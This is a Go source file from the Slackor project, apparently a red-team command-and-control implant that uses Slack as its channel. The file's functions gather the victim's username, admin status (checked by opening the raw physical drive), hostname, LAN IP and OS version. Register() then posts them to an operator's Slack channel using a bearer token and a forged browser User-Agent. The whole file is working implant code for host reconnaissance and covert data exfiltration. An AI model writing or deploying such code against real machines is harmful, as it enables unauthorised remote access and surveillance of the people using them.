package slack

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"strings"
	"time"

	"github.com/Coalfire-Research/Slackor/internal/config"
)

func whoami() string { // returns the current user
	user, err := user.Current()
	if err != nil {
		return ("NAME_ERROR")
	}
	return string(user.Username)
}

func checkForAdmin() bool { //attempts to get a file handle on MBR, only Admin can
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func hostname() string { // Returns the computer hostname
	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	return name
}

func getVersion() string {
	return config.OSVersion
}

func getLANOutboundIP() string { // Get preferred outbound ip of this machine
	conn, err := net.Dial("udp", "4.5.6.7:1337") //This doesn't actually make a connection
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	IP := localAddr.IP.String()
	return IP

}

func Register(clientID string) { // Send a message to the registration channel with the client ID and OS info
	client := &http.Client{Timeout: time.Second * 10}
	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	URL := "https://slack.com/api/chat.postMessage"
	v := url.Values{}
	v.Set("channel", config.RegistrationChannel)
	user := whoami()
	if checkForAdmin() {
		user = whoami() + "*"
	} else {
		user = whoami()
	}
	info := clientID + ":" + name + ":" + user + ":" + getLANOutboundIP() + ":" + string(getVersion())
	v.Set("text", info)
	//pass the values to the request's body
	req, err := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
	req.Header.Add("Authorization", "Bearer "+config.Bearer)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	_, netError := client.Do(req)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
	}
}
